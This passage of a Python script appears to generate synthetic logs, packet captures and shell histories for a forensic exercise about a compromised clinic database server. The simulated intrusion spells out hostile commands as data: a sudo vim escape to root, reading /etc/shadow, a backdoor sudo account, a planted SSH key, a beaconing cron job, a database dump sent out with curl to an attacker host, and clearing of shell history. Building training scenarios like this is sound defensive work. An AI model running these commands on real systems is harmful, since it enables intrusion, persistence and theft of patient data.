            if not (h == 23 and m == 0):
                cron_job(tj, u, c, du)
        if h == 23 and m == 0:
            backup_job(t + jitter)
        if h == 0 and m == 0:
            logrotate(t + random.uniform(0.2, 1.5))
        if h == 6 and m == 0 or (h == 0 and m == 31) or (h == 11 and m == 44) or (h == 18 and m == 2):
            systemd_timer(t + random.uniform(1, 50), h)
        t += 60
    sysl(T(30, 1, 18, 1.24), f"cron[{CRON_PID}]", "(*system*mariadb-health) RELOAD (/etc/cron.d/mariadb-health)")

def logrotate(t):
    for k, m in enumerate(["Starting Rotate log files...", "Starting Daily man-db regeneration..."]):
        sysl(t + k * 0.01, "systemd[1]", m)
    sysl(t + 0.4, f"rsyslogd[{RSYSLOG_PID}]", '[origin software="rsyslogd" swVersion="8.2112.0" x-pid="804" x-info="https://www.rsyslog.com"] rsyslogd was HUPed')
    sysl(t + 0.45, "systemd[1]", "logrotate.service: Deactivated successfully.")
    sysl(t + 0.45, "systemd[1]", "Finished Rotate log files.")
    sysl(t + 1.9, "systemd[1]", "man-db.service: Deactivated successfully.")
    sysl(t + 1.9, "systemd[1]", "Finished Daily man-db regeneration.")

def systemd_timer(t, h):
    names = {6: ("apt-daily-upgrade.service", "Daily apt upgrade and clean activities"), 0: ("dpkg-db-backup.service", "Daily dpkg database backup service"),
             11: ("motd-news.service", "Message of the Day"), 18: ("apt-daily.service", "Daily apt download activities")}
    svc, desc = names[h]
    sysl(t, "systemd[1]", f"Starting {desc}...")
    sysl(t + random.uniform(0.2, 3), "systemd[1]", f"{svc}: Deactivated successfully.")
    sysl(t + random.uniform(3, 4), "systemd[1]", f"Finished {desc}.")

# ======================================================================= 2. backup nocturno (cron + SSH a nas01)
BACKUP_BYTES = {}
def backup_job(t):
    p = pid_at(t)
    auth(t, f"CRON[{p}]", "pam_unix(cron:session): session opened for user backup(uid=34) by (uid=0)")
    sysl(t, f"CRON[{p}]", f"(backup) CMD ({CMD_BACKUP})")
    t_dump = t + random.uniform(205, 222)
    t_ssh = t_dump + 0.6
    day = dt(t).strftime("%Y-%m-%d")
    size = random.randint(2_390_000, 2_460_000)
    BACKUP_BYTES[day] = size
    if CAP_START <= t <= CAP_END:
        dns_query(t_ssh - 0.003, "nas01.kelbrook.internal", NAS)
        x = Ssh(DB, eph(DB, t_ssh), NAS, 22, "openssh89c", "nas")
        tt = x.handshake(t_ssh, "backup")
        tt = x.publickey(tt + 0.002, "backup")
        tt = x.c(tt + 0.001, x.E(24)); tt = x.s(tt + 0.0004, x.E(17))                     # channel open
        tt = x.c(tt + 0.001, x.E(95)); tt = x.s(tt + 0.05, x.E(13, 5))                    # exec "rsync --server ..."
        tt = x.s(tt + 0.01, x.E(13)); tt = x.c(tt + 0.001, x.E(13))                       # versión de protocolo rsync
        tt = x.s(tt + 0.02, x.E(9 + 210)); tt = x.c(tt + 0.01, x.E(9 + 640))              # listas de ficheros
        tt = x.s(tt + 0.03, x.E(9 + 180))                                                # sumas del receptor
        plens, left = [], size
        while left > 0:
            c = min(32768, left); plens.append(9 + c); left -= c
        tt = x.c(tt + 0.002, x.E(*plens))
        tt = x.s(tt + 0.2, x.E(9 + 48)); tt = x.c(tt + 0.001, x.E(9 + 12))
        tt = x.s(tt + 0.01, x.E(25, 5, 5)); tt = x.c(tt + 0.001, x.E(5, 33))
        t_end = x.tcp.close(tt + 0.002, by_client=True)
    else:
        t_end = t_ssh + random.uniform(45, 52)
    sysl(t_end + 0.6, "db-backup", f"copia {day} enviada a nas01")
    auth(t_end + 0.7, f"CRON[{p}]", "pam_unix(cron:session): session closed for user backup")

# ======================================================================= 3. beacons del cron malicioso
BEACONS = []
def beacon(t):
    BEACONS.append(t)
    tcp = Tcp(DB, eph(DB, t), ATTACKER, C2_PORT)
    tt = tcp.open(t + 0.035)
    req = (f"GET /c/{HOST} HTTP/1.1\r\nHost: {ATTACKER}:{C2_PORT}\r\nUser-Agent: curl/7.81.0\r\nAccept: */*\r\n\r\n").encode()
    tt = tcp.data(tt + 0.0002, True, req)
    resp = (f"HTTP/1.0 200 OK\r\nServer: BaseHTTP/0.6 Python/3.11.2\r\nDate: {http_date(tt)}\r\n"
            "Content-Type: text/plain\r\nContent-Length: 0\r\n\r\n").encode()
    tt = tcp.data(tt + 0.0008, False, resp)
    tcp.close(tt, by_client=False)

# ======================================================================= 4. ruido de red en la ventana de captura
def network_noise():
    # MySQL desde web01: tráfico del portal (Poisson por hora) + limpieza de sesiones cada 5 min
    rate = {22: 46, 23: 28, 0: 14, 1: 8, 2: 6}
    conns, t = [], CAP_START
    while True:
        t += random.expovariate(rate[dt(t).hour] / 3600)
        if t >= CAP_END: break
        conns.append((t, random.choice([["productos"], ["sesion", "huecos"], ["sesion"], ["sesion", "productos"], ["huecos"]])))
    t = CAP_START + 60
    while t < CAP_END:
        conns.append((t + random.uniform(0.2, 1.8), ["limpieza"]))
        t += 300
    for t, kinds in sorted(conns):
        mysql_conn(t, kinds)
    # NTP (systemd-timesyncd, servidor configurado por IP)
    t = CAP_START + 849.3
    while t < CAP_END:
        ntp_poll(t); t += 2048 + random.uniform(-0.4, 0.4)

# ======================================================================= 5. escáneres de fondo
SCAN_USERS = ["root", "root", "root", "admin", "ubuntu", "test", "user", "oracle", "postgres", "pi", "git", "ftpuser", "guest", "mysql", "support1"]
EXISTING = {"root", "mysql", "kbadmin", "mvega", "portal_app", "jnavarro", "backup"}
SCAN_COUNT = {}

def scanner_burst(ip, t, n, gap, pcap=False):
    for _ in range(n):
        u = random.choice(SCAN_USERS)
        port = eph(ip, t)
        if pcap:
            x = Ssh(ip, port, DB, 22, "libssh2")
            th = tt = x.handshake(t, u)
            tt = x.password(tt + 0.01, u, random.randint(6, 12), False)
            tf = tt - RTT[SCANNER] - 2.1
            x.c(tt + 0.01, x.E(29), ack=False)                      # DISCONNECT "Bye Bye"
            x.tcp.close(tt + 0.012, by_client=True)
        else:
            th = None
            tf = t + random.uniform(0.8, 1.6)
        ssh_fail(t, [tf], u, ip, port, "byebye", valid=u in EXISTING, t_user=th)
        SCAN_COUNT[ip] = SCAN_COUNT.get(ip, 0) + 1
        t += random.uniform(*gap)
    return t

def background_scanners():
    rng = random.Random(77)
    for day in range(1, 30):
        for _ in range(rng.randint(0, 3)):
            ip = rng.choice([f"198.51.100.{rng.randint(2, 250)}", f"203.0.113.{rng.randint(2, 250)}", f"192.0.2.{rng.randint(150, 250)}"])
            if ip in (ATTACKER, SCANNER, SCANNER2): continue
            t = T(day, rng.randint(0, 23), rng.randint(0, 59), rng.uniform(0, 59))
            if CAP_START - 3600 <= t <= CAP_END: continue
            scanner_burst(ip, t, rng.randint(2, 14), (3, 40))
    scanner_burst(SCANNER, T(29, 23, 41, 7.2), 1, (0, 0), pcap=True)
    t = T(29, 23, 41, 7.2) + 17.1
    while t < T(30, 0, 36, 20):
        t = scanner_burst(SCANNER, t, 1, (15.0, 20.0), pcap=True)
    scanner_burst(SCANNER2, T(30, 4, 12, 44), 8, (9, 26))

# ======================================================================= 6. sesiones legítimas
def ws_session(t_open, t_out, sid, cmds, sudo_cmd=None):
    """Sesión de mvega desde ws-it-02 con PuTTY. cmds: (t_enter, texto, bytes_salida)."""
    port = random.randint(50000, 50999)
    x = Ssh(WS, port, DB, 22, "putty")
    tt = x.handshake(t_open, "mvega")
    tt = x.publickey(tt + 0.05, "mvega")
    ssh_login(tt, t_out, "mvega", WS, port, "publickey", sid, fp=fingerprint(KEY_MVEGA))
    sh = Shell(x, tt)
    for te, txt, out in cmds:
        HIST["mvega"].append((te, txt))
        sh.run(te, txt, out)
        if sudo_cmd and txt.startswith("sudo "):
            tpw = te + 5.7
            sh.keys(tpw, "Rkmv-0315#ok", echo=False)
            x.tcp.data(tpw, True, x.E(10), ack=False)
            sudo(tpw + 0.12, "mvega", "/home/mvega", sudo_cmd, close_t=tpw + 0.3)
            sh._out(tpw + 0.3, 1900)
    HIST["mvega"].append((t_out - 0.6, "exit"))
    sh.run(t_out - 0.6, "exit", 7)
    sh.close(t_out)

def legit_logins():
    # Sesiones de mvega antes de la ventana (solo host)
    for t0, t1, sid, cmds in [
        (T(28, 9, 12, 40.2), T(28, 9, 58, 10.4), 309, ["systemctl status mariadb --no-pager", "df -h", "ls -lh /var/backups/mariadb/", "tail -n 50 /var/log/mysql/error.log"]),
        (T(29, 9, 4, 15.8), T(29, 9, 51, 30.1), 310, ["uptime", "sudo mysql -e \"SHOW ENGINE INNODB STATUS\\G\" | head -40", "df -h /var/lib/mysql"]),
        (T(29, 15, 31, 2.6), T(29, 15, 36, 44.9), 311, ["ls -lh /var/backups/mariadb/", "free -m"]),
    ]:
        port = random.randint(50000, 50999)
        ssh_login(t0, t1, "mvega", WS, port, "publickey", sid, fp=fingerprint(KEY_MVEGA))
        tc = t0 + 20
        for c in cmds:
            tc += random.uniform(40, 600)
            HIST["mvega"].append((tc, c))
            if c.startswith("sudo "):
                sudo(tc + 4.4, "mvega", "/home/mvega", "/usr/bin/mysql -e SHOW ENGINE INNODB STATUS\\G", close_t=tc + 4.9)
        HIST["mvega"].append((t1 - 0.6, "exit"))
    # Revisión nocturna de la DBA (en la captura)
    ws_session(T(29, 22, 3, 10.9), T(29, 22, 17, 48.3), 312, [
        (T(29, 22, 3, 31.4), "systemctl status mariadb --no-pager", 1420),
        (T(29, 22, 4, 10.2), "df -h", 690),
        (T(29, 22, 5, 2.5), "sudo mysql -e \"SHOW PROCESSLIST\"", 0),
        (T(29, 22, 7, 40.8), "ls -lh /var/backups/mariadb/", 610),
        (T(29, 22, 9, 15.1), "tail -n 30 /var/log/mysql/error.log", 3150),
        (T(29, 22, 16, 50.6), "uptime", 70),
    ], sudo_cmd="/usr/bin/mysql -e SHOW PROCESSLIST")
    # Mañana del 30: la DBA entra, ve el cron y lanza la recogida (sesión abierta en el triage)
    LIVE["sshd_pid"] = ssh_login(T(30, 8, 4, 37.3), None, "mvega", WS, 50877, "publickey", 315, fp=fingerprint(KEY_MVEGA))
    sudo(T(30, 8, 27, 50.6), "mvega", "/home/mvega", "/bin/bash /tmp/ir-collect.sh")

# ======================================================================= 7. intrusión
def intrusion():
    A = ATTACKER
    # --- intentos fallidos (cuatro conexiones) ---
    attempts = [(51718, T(30, 1, 2, 8.31), "root", [T(30, 1, 2, 13.9), T(30, 1, 2, 20.8)], True),
                (51722, T(30, 1, 2, 27.12), "nhollis", [T(30, 1, 2, 31.0)], False),
                (51726, T(30, 1, 2, 36.05), "deploy", [T(30, 1, 2, 39.4)], False),
                (51730, T(30, 1, 2, 45.02), "admin", [T(30, 1, 2, 48.9)], False)]
    for port, t0, user, pws, valid in attempts:
        x = Ssh(A, port, DB, 22, "openssh84")
        tt = x.handshake(t0, user)
        for tp in pws:
            x.password(tp, user, 12, False)
        tl = pws[-1] + 2.1 + RTT[A]
        x.tcp.close(tl + 1.5, by_client=True)
        ssh_fail(t0, pws, user, A, port, "closed", valid=valid, t_user=tt)

    # --- acceso con portal_app ---
    port = 51734
    x = Ssh(A, port, DB, 22, "openssh84")
    tt = x.handshake(T(30, 1, 3, 1.2), "portal_app")
    t_acc = T(30, 1, 3, 5.0)
    x.password(t_acc - 0.02, "portal_app", 14, True)
    t_logout = T(30, 1, 27, 3.1)
    ssh_login(t_acc, t_logout, "portal_app", A, port, "password", 313)
    sh = Shell(x, t_acc + 0.05)

    def S(h, m, s): return T(30, h, m, s)
    # Reconocimiento como portal_app (el historial se borra después)
    for te, txt, out in [(S(1, 3, 20.4), "id", 62), (S(1, 3, 31.0), "hostname", 5), (S(1, 3, 40.7), "uname -a", 112),
                         (S(1, 3, 58.2), "cat /etc/os-release", 386), (S(1, 4, 30.5), "cat /etc/passwd", 1912),
                         (S(1, 5, 41.3), "sudo -l", 412), (S(1, 6, 50.9), "ss -tlnp", 640), (S(1, 7, 35.6), "ps aux", 11240),
                         (S(1, 8, 40.1), "ls -la /etc/mysql/mariadb.conf.d/", 498), (S(1, 9, 20.8), "cat /etc/sudoers.d/portal_app", 60)]:
        sh.run(te, txt, out)
        if txt == "sudo -l":
            sudo(te + 0.03, "portal_app", "/home/portal_app", "list")
    # Escalada: sudo vim y escape a shell
    t_vim = S(1, 10, 18.2)
    sh.run(t_vim, "sudo /usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf", 2740, wait=0.09)
    sudo(t_vim + 0.04, "portal_app", "/home/portal_app", "/usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf", close_t=S(1, 26, 19.3))
    t_bang = S(1, 10, 27.6)
    sh.run(t_bang, ":!/bin/bash", 1800)
    VIMINFO["bang"] = t_bang
    root_cmds = [
        (S(1, 10, 31.5), "id", 39, 0.02), (S(1, 10, 44.9), "cat /etc/shadow", 1390, 0.02),
        (S(1, 11, 30.2), "mysql -e 'SHOW DATABASES'", 260, 0.08), (S(1, 12, 15.7), "mysql -e 'SELECT COUNT(*) FROM kb_clinica.pacientes'", 64, 0.06),
        (S(1, 13, 20.4), "mysql kb_clinica -e 'SHOW TABLES'", 150, 0.06),
        (S(1, 15, 2.0), "useradd -m -s /bin/bash -G sudo support", 0, 0.12), (S(1, 15, 9.3), "passwd support", 18, 0.02),
        (S(1, 16, 5.1), "mkdir -p /root/.ssh", 0, 0.01), (S(1, 16, 20.0), f"echo '{pubkey_line(KEY_ATTACKER, 'ops@kelbrook-backup')}' >> /root/.ssh/authorized_keys", 0, 0.01),
        (S(1, 16, 31.4), "chmod 600 /root/.ssh/authorized_keys", 0, 0.01),
        (S(1, 17, 40.1), f"echo '*/10 * * * * root {CMD_EVIL}' > /etc/cron.d/mariadb-health", 0, 0.01),
        (S(1, 17, 52.6), "cat /etc/cron.d/mariadb-health", 76, 0.01),
        (S(1, 20, 40.3), "mkdir /var/tmp/.font-cache", 0, 0.01), (S(1, 20, 58.1), "mysqldump kb_clinica > /var/tmp/.font-cache/kb_clinica.sql", 0, 1.9),
        (S(1, 22, 30.0), "cd /var/tmp/.font-cache", 0, 0.01), (S(1, 22, 41.2), "ls -la", 230, 0.01),
        (S(1, 23, 10.4), "tar czf kb_clinica.tgz kb_clinica.sql", 0, 0.32), (S(1, 23, 24.9), "ls -la", 300, 0.01),
        (S(1, 24, 5.3), f"curl -F 'f=@kb_clinica.tgz' {C2_URL}/up", 3, None),
        (S(1, 25, 21.7), "cd /", 0, 0.01), (S(1, 25, 30.2), "rm -rf /var/tmp/.font-cache", 0, 0.02),
        (S(1, 26, 12.4), "exit", 120, 0.01),
    ]
    for te, txt, out, wait in root_cmds:
        HIST["root"].append((te, txt))
        paste = txt.startswith("echo ")
        if txt.startswith("useradd"):
            sh.run(te, txt, out, wait=wait, paste=paste)
            p = pid_at(te)
            auth(te + 0.03, f"useradd[{p}]", "new group: name=support, GID=1004")
            auth(te + 0.03, f"useradd[{p}]", "new user: name=support, UID=1004, GID=1004, home=/home/support, shell=/bin/bash, from=/dev/pts/0")
            auth(te + 0.05, f"useradd[{p}]", "add 'support' to group 'sudo'")
            auth(te + 0.05, f"useradd[{p}]", "add 'support' to shadow group 'sudo'")
        elif txt == "passwd support":
            sh.run(te, txt, 20)
            for k, tp in enumerate([te + 4.6, te + 9.9]):
                sh.keys(tp, "Soporte2026!", echo=False)
                x.tcp.data(tp, True, x.E(10), ack=False)
                sh._out(tp + 0.02, 32 if k == 0 else 40)
            auth(te + 9.95, f"passwd[{pid_at(te + 9.9)}]", "pam_unix(passwd:chauthtok): password changed for support")
            FILE_TIMES["shadow"] = te + 9.95
        elif txt.startswith("curl -F"):
            sh.keys(te - 0.3, txt)
            x.tcp.data(te, True, x.E(10), ack=False)
            t_done = exfil(te + 0.03)
            sh._out(t_done + 0.004, 3)
        else:
            sh.run(te, txt, out, wait=wait, paste=paste)
    # Vuelta a vim, :q!, history -c y salida
    sh.run(S(1, 26, 14.1), "", 40)
    sh.run(S(1, 26, 19.2), ":q!", 30)
    VIMINFO["quit"] = S(1, 26, 19.2)
    sh.run(S(1, 26, 52.0), "history -c", 0)
    sh.run(S(1, 27, 2.4), "exit", 7)
    HIST["portal_app"].append((S(1, 27, 2.4), "exit"))
    sh.close(t_logout)

    # --- regreso como root con la clave plantada ---
    port = 51902
    x = Ssh(A, port, DB, 22, "openssh84")
    tt = x.handshake(T(30, 2, 5, 14.6), "root")
    t_acc = T(30, 2, 5, 17.1)
    x.publickey(t_acc - 0.012, "root")
    t_out = T(30, 2, 7, 2.2)
    ssh_login(t_acc, t_out, "root", A, port, "publickey", 314, fp=fingerprint(KEY_ATTACKER))
    sh = Shell(x, t_acc + 0.05, motd=1420)
    for te, txt, out in [(T(30, 2, 5, 31.2), "id", 39), (T(30, 2, 5, 40.6), "crontab -l", 24), (T(30, 2, 5, 52.3), "cat /etc/cron.d/mariadb-health", 76),
                         (T(30, 2, 6, 10.9), "tail -n 3 /etc/passwd", 190), (T(30, 2, 6, 35.4), "w", 330), (T(30, 2, 7, 1.5), "exit", 7)]:
        HIST["root"].append((te, txt))
        sh.run(te, txt, out)
    sh.close(t_out)

EXFIL = {}
def exfil(t):
    tcp = Tcp(DB, eph(DB, t), ATTACKER, C2_PORT)
    tt = tcp.open(t)
    boundary = "------------------------" + rnd(8).hex()
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"kb_clinica.tgz\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n").encode() + EXFIL["tgz"] + f"\r\n--{boundary}--\r\n".encode()
    hdr = (f"POST /up HTTP/1.1\r\nHost: {ATTACKER}:{C2_PORT}\r\nUser-Agent: curl/7.81.0\r\nAccept: */*\r\n"
           f"Content-Length: {len(body)}\r\nContent-Type: multipart/form-data; boundary={boundary}\r\nExpect: 100-continue\r\n\r\n").encode()
    tt = tcp.data(tt + 0.0003, True, hdr)
    tt = tcp.data(tt + 1.0, True, body)           # curl espera 1 s el 100-continue que el servidor HTTP/1.0 no manda
    resp = (f"HTTP/1.0 200 OK\r\nServer: BaseHTTP/0.6 Python/3.11.2\r\nDate: {http_date(tt)}\r\n"
            "Content-Type: text/plain\r\nContent-Length: 3\r\n\r\nok\n").encode()
    tt = tcp.data(tt + 0.09, False, resp)
    EXFIL.update(t=t, content_length=len(body), boundary=boundary)
    return tcp.close(tt, by_client=False)

VIMINFO, FILE_TIMES = {}, {}

# ======================================================================= 8. historia previa (antes de auth.log: solo wtmp, lastlog e historiales)
KERNEL = "5.15.0-122-generic"
MVEGA_POOL = ["systemctl status mariadb --no-pager", "df -h", "df -h /var/lib/mysql", "ls -lh /var/backups/mariadb/", "free -m", "uptime",
              "tail -n 50 /var/log/mysql/error.log", "sudo mysql -e \"SHOW PROCESSLIST\"", "du -sh /var/lib/mysql/*", "journalctl -u mariadb --since today --no-pager | tail"]

def prior_history():
    rng = random.Random(14)
    for day in range(1, 27):
        d = datetime(2026, 9, day, tzinfo=timezone.utc)
        if d.weekday() >= 5 or day == 14: continue
        t0 = T(day, 9, rng.randint(0, 25), rng.uniform(0, 59))
        t1 = t0 + rng.uniform(900, 3600)
        p = pid_at(t0, span=3) + 2
        WTMP.append((t0, utmp_rec(7, p, "pts/0", "ts/0", "mvega", WS, t0, WS)))
        WTMP.append((t1, utmp_rec(8, p, "pts/0", "ts/0", "", "", t1)))
        LASTLOG[1001] = (t0, "pts/0", WS)
        tc = t0
        for c in rng.sample(MVEGA_POOL, rng.randint(2, 4)):
            tc += rng.uniform(30, (t1 - t0) / 4)
            HIST["mvega"].append((tc, c))
        HIST["mvega"].append((t1 - 0.5, "exit"))
    # 14/09: ventana de mantenimiento y reinicio (la sesión queda "down" en wtmp)
    t0 = T(14, 2, 51, 9.4)
    WTMP.append((t0, utmp_rec(7, 47712, "pts/0", "ts/0", "mvega", WS, t0, WS)))
    for k, c in enumerate(["sudo -i"]):
        HIST["mvega"].append((t0 + 21, c))
    for k, c in enumerate(["apt update", "apt list --upgradable", "apt upgrade -y", "systemctl status mariadb --no-pager", "reboot"]):
        HIST["root"].append((t0 + 40 + k * 140, c))
    WTMP.append((T(14, 3, 11, 58.1), utmp_rec(1, 0, "~", "~~", "shutdown", KERNEL, T(14, 3, 11, 58.1))))
    WTMP.append((BOOT_T, utmp_rec(2, 0, "~", "~~", "reboot", KERNEL, BOOT_T)))
    WTMP.append((BOOT_T + 9.3, utmp_rec(1, 53, "~", "~~", "runlevel", KERNEL, BOOT_T + 9.3)))
    # 18/09: despliegue del portal hecho por la DBA con la cuenta portal_app
    t0, t1 = T(18, 10, 42, 13.0), T(18, 11, 5, 40.7)
    PA18 = pid_at(t0, span=3) + 2
    WTMP.append((t0, utmp_rec(7, PA18, "pts/0", "ts/0", "portal_app", WS, t0, WS)))
    WTMP.append((t1, utmp_rec(8, PA18, "pts/0", "ts/0", "", "", t1)))
    LASTLOG[1002] = (t0, "pts/0", WS)
    for k, c in enumerate(["cd /opt/kb-deploy", "git pull", "ls migrations/", "mysql -u portal_app -p kb_portal < migrations/2026-09-18_huecos_cita.sql",
                           "mysql -u portal_app -p kb_portal -e 'SHOW TABLES'", "exit"]):
        HIST["portal_app"].append((t0 + 30 + k * 190 if c != "exit" else t1 - 0.4, c))
    LASTLOG[1000] = (datetime(2025, 8, 4, 10, 12, 51, tzinfo=timezone.utc).timestamp(), "pts/0", "10.20.30.250")
    LASTLOG[1003] = (datetime(2026, 6, 27, 12, 31, 8, tzinfo=timezone.utc).timestamp(), "pts/1", "10.20.30.61")

def old_static_history():
    """Entradas antiguas: las anteriores al 06/08/2025 no tienen marca de tiempo."""
    root_old = [(None, c) for c in ["apt update", "apt install -y mariadb-server", "mysql_secure_installation", "systemctl enable --now mariadb",
                                    "vim /etc/mysql/mariadb.conf.d/50-server.cnf", "systemctl restart mariadb", "adduser mvega", "usermod -aG sudo mvega",
                                    "exit"]]
    root_old += [(datetime(2025, 8, 12, 9, 15, 2, tzinfo=timezone.utc).timestamp(), "adduser portal_app"),
                 (datetime(2025, 8, 12, 9, 18, 40, tzinfo=timezone.utc).timestamp(), "vim /etc/ssh/sshd_config"),
                 (datetime(2025, 8, 12, 9, 19, 55, tzinfo=timezone.utc).timestamp(), "systemctl restart ssh"),
                 (datetime(2025, 8, 14, 16, 2, 11, tzinfo=timezone.utc).timestamp(), "vim /usr/local/bin/db-backup.sh"),
                 (datetime(2025, 8, 14, 16, 9, 30, tzinfo=timezone.utc).timestamp(), "chmod 755 /usr/local/bin/db-backup.sh"),
                 (datetime(2025, 8, 14, 16, 10, 2, tzinfo=timezone.utc).timestamp(), "vim /etc/cron.d/db-backup"),
                 (datetime(2025, 8, 14, 16, 12, 45, tzinfo=timezone.utc).timestamp(), "exit"),
                 (datetime(2026, 6, 30, 8, 55, 12, tzinfo=timezone.utc).timestamp(), "usermod -L jnavarro"),
                 (datetime(2026, 6, 30, 8, 55, 30, tzinfo=timezone.utc).timestamp(), "exit"),
                 (datetime(2026, 8, 12, 9, 40, 3, tzinfo=timezone.utc).timestamp(), "visudo -f /etc/sudoers.d/portal_app"),
                 (datetime(2026, 8, 12, 9, 41, 20, tzinfo=timezone.utc).timestamp(), "exit")]
    HIST["root"][:0] = root_old
    pa_old = [(datetime(2025, 8, 12, 9, 31, 4, tzinfo=timezone.utc).timestamp() + k * 70, c) for k, c in
              enumerate(["git clone ssh://git@10.20.30.10/srv/git/kb-deploy.git /opt/kb-deploy", "cd /opt/kb-deploy", "./migrate.sh --check", "exit"])]
    HIST["portal_app"][:0] = pa_old
    HIST["jnavarro"] = [(datetime(2026, 6, 27, 12, 31, 30, tzinfo=timezone.utc).timestamp() + k * 95, c) for k, c in
                        enumerate(["ls", "cd /var/log/mysql", "ls -la", "mysql -u jnavarro -p -e 'SHOW DATABASES'", "exit"])]

def bash_history(entries):
    out = []
    for t, c in sorted(entries, key=lambda e: (e[0] is not None, e[0] or 0)):
        if t is not None: out.append(f"#{int(t)}")
        out.append(c)
    return ("\n".join(out) + "\n").encode()

def viminfo():
    tq, tb = int(VIMINFO["quit"]), int(VIMINFO["bang"])
    f = "/etc/mysql/mariadb.conf.d/50-server.cnf"
    return f"""# This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,{tq},,"q!"
:!/bin/bash
|2,0,{tb},,"!/bin/bash"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  1  0  {f}
|4,48,1,0,{tq},"{f}"

# Jumplist (newest first):
-'  1  0  {f}
|4,39,1,0,{tq},"{f}"

# History of marks within files (newest to oldest):

> {f}
\t*\t{tq}\t0
\t"\t1\t0
""".encode()

def lastlog_file():
    rec = struct.Struct("<i32s256s")
    buf = bytearray(rec.size * 1005)
    for uid, (t, line, host) in LASTLOG.items():
        buf[uid * rec.size:(uid + 1) * rec.size] = rec.pack(int(t), line.encode(), host.encode())
    return bytes(buf)

# ======================================================================= 9. salida en caliente del script de recogida
def iso(t): d = dt(t); return d.strftime("%Y-%m-%d %H:%M:%S.") + f"{random.randint(0, 999999999):09d} +0000"

def stat_block(path, kind, size, mode, uid, user, gid, group, atime, mtime, ctime, birth, inode, links=1, blocks=8):
    return (f"  File: {path}\n  Size: {size:<10}\tBlocks: {blocks:<10} IO Block: 4096   {kind}\n"
            f"Device: fd00h/64768d\tInode: {inode:<11} Links: {links}\n"
            f"Access: ({mode})  Uid: ({uid:>5}/{user:>8})   Gid: ({gid:>5}/{group:>8})\n"
            f"Access: {iso(atime)}\nModify: {iso(mtime)}\nChange: {iso(ctime)}\n Birth: {iso(birth)}\n")

def live_outputs(files):
    inst = datetime(2025, 8, 4, 10, 2, 18, tzinfo=timezone.utc).timestamp()
    pw, sh_ = files["etc/passwd"], files["etc/shadow"]
    st = [
        stat_block("/etc/passwd", "regular file", len(pw[0]), "0644/-rw-r--r--", 0, "root", 0, "root", T(30, 8, 27, 51), pw[1], pw[1], pw[1], 1310944),
        stat_block("/etc/shadow", "regular file", len(sh_[0]), "0640/-rw-r-----", 0, "root", 42, "shadow", T(30, 8, 27, 50.7), sh_[1], sh_[1], sh_[1], 1311007),
        stat_block("/etc/sudoers.d/portal_app", "regular file", len(SUDOERS_PORTAL.encode()), "0440/-r--r-----", 0, "root", 0, "root",
                   T(29, 22, 5, 8.1), T(12, 9, 41, 7.4) - 49 * 86400, T(12, 9, 41, 7.4) - 49 * 86400, T(12, 9, 41, 7.4) - 49 * 86400, 1311581),
        stat_block("/etc/cron.d", "directory", 4096, "0755/drwxr-xr-x", 0, "root", 0, "root", T(30, 1, 18, 1.2), T(30, 1, 17, 40.1), T(30, 1, 17, 40.1), inst, 1310722, links=2),
        stat_block("/etc/cron.d/mariadb-health", "regular file", len(CRON_D["mariadb-health"]), "0644/-rw-r--r--", 0, "root", 0, "root",
                   T(30, 1, 18, 1.2), T(30, 1, 17, 40.1), T(30, 1, 17, 40.1), T(30, 1, 17, 40.1), 1311020),
        stat_block("/root/.ssh", "directory", 4096, "0700/drwx------", 0, "root", 0, "root", T(30, 2, 5, 17.1), T(30, 1, 16, 20.0), T(30, 1, 16, 20.0), T(30, 1, 16, 5.1), 524451, links=2),
        stat_block("/root/.ssh/authorized_keys", "regular file", len(files["root/.ssh/authorized_keys"][0]), "0600/-rw-------", 0, "root", 0, "root",
                   T(30, 2, 5, 17.1), T(30, 1, 16, 20.0), T(30, 1, 16, 31.4), T(30, 1, 16, 20.0), 524452),
        stat_block("/home/support", "directory", 4096, "0750/drwxr-x---", 1004, "support", 1004, "support", T(30, 1, 15, 2.1), T(30, 1, 15, 2.1), T(30, 1, 15, 2.1), T(30, 1, 15, 2.1), 393311, links=2),
        stat_block("/var/tmp", "directory", 4096, "1777/drwxrwxrwt", 0, "root", 0, "root", T(30, 1, 25, 30.2), T(30, 1, 25, 30.2), T(30, 1, 25, 30.2), inst, 655362, links=4),
    ]
    sid = "4f1c92a7d03e4b5c8e61a9d2f7b03c18"
    ls = f"""/dev/shm:
total 0
drwxrwxrwt  2 root root   40 2026-09-14 03:12:51.204118372 +0000 .
drwxr-xr-x 19 root root 4000 2026-09-14 03:12:50.881027449 +0000 ..

/tmp:
total 28
drwxrwxrwt  7 root  root  4096 2026-09-30 08:27:44.316280114 +0000 .
drwxr-xr-x 19 root  root  4096 2026-09-14 03:12:41.092877120 +0000 ..
-rwxr-xr-x  1 mvega mvega 1544 2026-09-30 08:27:44.316280114 +0000 ir-collect.sh
drwx------  3 root  root  4096 2026-09-14 03:12:53.418820941 +0000 snap-private-tmp
drwx------  3 root  root  4096 2026-09-14 03:12:53.470211395 +0000 systemd-private-{sid}-systemd-logind.service-Xn2b7c
drwx------  3 root  root  4096 2026-09-14 03:12:52.990513320 +0000 systemd-private-{sid}-systemd-resolved.service-Qe81Lw
drwx------  3 root  root  4096 2026-09-14 03:12:52.957706153 +0000 systemd-private-{sid}-systemd-timesyncd.service-a2Hm0R

/var/tmp:
total 16
drwxrwxrwt  4 root root 4096 2026-09-30 01:25:30.551920736 +0000 .
drwxr-xr-x 14 root root 4096 2025-08-04 10:02:18.774310029 +0000 ..
drwx------  3 root root 4096 2026-09-14 03:12:53.471004812 +0000 systemd-private-{sid}-systemd-logind.service-RgT31p
drwx------  3 root root 4096 2026-09-14 03:12:52.958113005 +0000 systemd-private-{sid}-systemd-timesyncd.service-Wq09dk
"""
    sp = LIVE["sshd_pid"].value()
    ps = f"""USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    Sep14   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   Sep14   0:00  \\_ [rcu_gp]
